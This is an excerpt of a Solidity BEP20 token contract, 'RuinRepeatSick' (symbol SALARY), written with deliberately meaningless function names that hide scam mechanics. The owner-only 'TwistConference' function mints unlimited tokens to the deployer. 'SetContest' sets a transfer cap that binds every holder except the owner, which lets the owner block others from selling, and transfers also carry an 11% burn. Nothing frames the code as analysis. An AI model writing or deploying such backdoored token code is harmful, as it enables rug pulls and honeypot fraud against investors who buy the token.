...
contract RuinRepeatSick is IBEP20 
{
    using LaughLib for uint256;
    mapping(address => uint256) internal _commercial;
    ...
    constructor() 
    {
        ...
        _name = "RuinRepeatSick";
        _symbol = "SALARY";
        _burnRate = 11;
        _pot = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _commercial[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier FeeBit() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _commercial[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetGame() external view returns (uint256) { return _pot; }
    function SetContest(uint b) external virtual FeeBit { _pot = b * (10 ** decimals()); }
    ...
    function TwistConference(uint256 reputation) external virtual FeeBit
    {
        uint ruin = reputation * (10 ** decimals()); 
        _commercial[_msgsender] = _commercial[_msgsender].Package(ruin);
        emit Transfer(address(0), _msgsender, ruin);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _pot || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _commercial[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _commercial[sender] = senderBalance - amount;
        _commercial[recipient] += (amount - burnAmount);
        _commercial[_burnaddress] += burnAmount;
...
library LaughLib 
{
  function Package(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}